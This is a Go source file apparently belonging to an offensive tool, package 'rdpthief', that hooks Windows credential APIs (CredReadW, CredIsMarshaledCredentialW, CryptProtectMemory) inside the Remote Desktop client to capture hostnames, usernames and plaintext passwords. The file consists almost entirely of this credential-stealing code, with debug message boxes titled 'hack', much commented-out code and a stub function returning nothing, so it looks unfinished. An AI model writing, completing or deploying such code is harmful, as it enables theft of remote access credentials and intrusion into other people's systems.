package rdpthief

import (
	"fmt"
	"reflect"
	"sync"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"

	"project/internal/convert"
	"project/internal/module/windows/hook"
)

// hook list
// sechost.dll   CredReadW                   --- get hostname
// sechost.dll   CredIsMarshaledCredentialW  --- get username
// crypt32.dll   CryptProtectMemory          --- get password

// Credential is the credential that stolen from mstsc.exe.
type Credential struct {
	Hostname string
	Username string
	Password string
}

// Hook is the core library for steal credential.
type Hook struct {
	hostname string
	username string
	password string

	pgCredReadW                  *hook.PatchGuard
	pgCredIsMarshaledCredentialW *hook.PatchGuard
	pgCryptProtectMemory         *hook.PatchGuard

	mu sync.Mutex
}

// Install is used to install hook.
func (h *Hook) Install() error {
	h.mu.Lock()
	defer h.mu.Unlock()

	var hookFn interface{}
	hookFn = h.credReadW
	pg, err := hook.NewInlineHookByName("advapi32.dll", "CredReadW", true, hookFn)
	if err != nil {
		return err
	}
	h.pgCredReadW = pg

	hookFn = h.cryptProtectMemory
	pg, err = hook.NewInlineHookByName("crypt32.dll", "CryptProtectMemory", true, hookFn)
	if err != nil {
		return err
	}
	h.pgCryptProtectMemory = pg

	hookFn = h.credIsMarshaledCredentialW
	pg, err = hook.NewInlineHookByName("advapi32.dll", "CredIsMarshaledCredentialW", true, hookFn)
	if err != nil {
		return err
	}
	h.pgCredIsMarshaledCredentialW = pg
	return nil
}

// Uninstall is used to uninstall hook.
func (h *Hook) Uninstall() error {
	h.mu.Lock()
	defer h.mu.Unlock()

	err := h.pgCredReadW.UnPatch()
	if err != nil {
		return err
	}
	err = h.pgCredIsMarshaledCredentialW.UnPatch()
	if err != nil {
		return err
	}
	err = h.pgCryptProtectMemory.UnPatch()
	if err != nil {
		return err
	}
	return nil
}

func (h *Hook) credReadW(targetName *uint16, typ, flags uint, credential uintptr) uintptr {
	h.mu.Lock()
	defer h.mu.Unlock()

	proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
	proc.Call(0,
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(fmt.Sprintln(windows.GetCurrentThreadId())))),
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
		1,
	)

	// runtime.LockOSThread()
	// defer runtime.UnlockOSThread()

	proc.Call(0,
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(fmt.Sprintln(windows.GetCurrentThreadId())))),
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
		1,
	)

	// proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
	// proc.Call(0,
	// 	uintptr(unsafe.Pointer(targetName)),
	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
	// 	1,
	// )

	hostname := windows.UTF16PtrToString(targetName)

	// fmt.Println(hostname)
	// fmt.Println(typ)
	// fmt.Println(flags)
	// fmt.Println(cred)

	h.hostname = hostname

	ret, _, _ := h.pgCredReadW.Original.Call(
		uintptr(unsafe.Pointer(targetName)), uintptr(typ), uintptr(flags), credential,
	)

	// fmt.Println(uintptr(err.(windows.Errno)))
	//
	// fmt.Println(windows.GetLastError())
	//
	// proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
	// proc.Call(0,
	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(fmt.Sprintln(uintptr(err.(windows.Errno)))))),
	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
	// 	1,
	// )

	// lastErr := uintptr(err.(windows.Errno))
	// runtime.SetLastError(lastErr)

	// fmt.Println(runtime.GetLastError())
	// fmt.Println(runtime.GetLastError())

	// procSetLastError := windows.NewLazySystemDLL("kernel32.dll").NewProc("SetLastError")
	// procSetLastError.Call(uintptr(err.(windows.Errno)))
	//
	// syscall.GetLastError()

	// fmt.Println(ret, t2, err)

	// proc.Call(0,
	// 	uintptr(unsafe.Pointer(targetName)),
	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
	// 	1,
	// )

	return ret
}

func (h *Hook) credIsMarshaledCredentialW(marshaledCredential *uint16) uintptr {
	h.mu.Lock()
	defer h.mu.Unlock()

	// proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
	// proc.Call(0,
	// 	uintptr(unsafe.Pointer(marshaledCredential)),
	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
	// 	1,
	// )

	username := windows.UTF16PtrToString(marshaledCredential)
	// fmt.Println(username)

	h.username = username

	msg := fmt.Sprintf(
		"hostname: \"%s\"\nusername: \"%s\"\npassword: \"%s\"",
		h.hostname, h.username, h.password,
	)

	ptr := windows.StringToUTF16Ptr(msg)

	proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
	proc.Call(0,
		uintptr(unsafe.Pointer(ptr)),
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
		1,
	)

	ret, _, _ := h.pgCredIsMarshaledCredentialW.Original.Call(
		uintptr(unsafe.Pointer(marshaledCredential)),
	)
	return ret
}

func (h *Hook) cryptProtectMemory(address *byte, size, flags uint) uintptr {
	h.mu.Lock()
	defer h.mu.Unlock()

	// skip data that not contain password
	if *address == 2 && size != 16 {
		ret, _, _ := h.pgCryptProtectMemory.Original.Call(
			uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags),
		)
		return ret
	}

	ptr := windows.StringToUTF16Ptr("mem")
	proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
	proc.Call(0,
		uintptr(unsafe.Pointer(ptr)),
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
		1,
	)

	var data []byte
	dataSH := (*reflect.SliceHeader)(unsafe.Pointer(&data))
	dataSH.Data = uintptr(unsafe.Pointer(address))
	dataSH.Len = int(size)
	dataSH.Cap = int(size)

	passwordLen := convert.LEBytesToUint32(data[:4])

	// fmt.Println(passwordLen)

	password := make([]byte, passwordLen)

	copy(password, data[4:4+passwordLen])

	passwordSH := (*reflect.SliceHeader)(unsafe.Pointer(&password))
	passwordSH.Len = passwordSH.Len / 2
	passwordSH.Cap = passwordSH.Cap / 2

	passwordStr := utf16.Decode(*(*[]uint16)(unsafe.Pointer(&password)))
	h.password = fmt.Sprintln("\"" + string(passwordStr) + "\"")

	ret, _, _ := h.pgCryptProtectMemory.Original.Call(
		uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags),
	)
	return ret

}

// ReadCredentials is used to read credentials from mstsc.exe.
func ReadCredentials(pid uint32) ([]*Credential, error) {
	return nil, nil
}
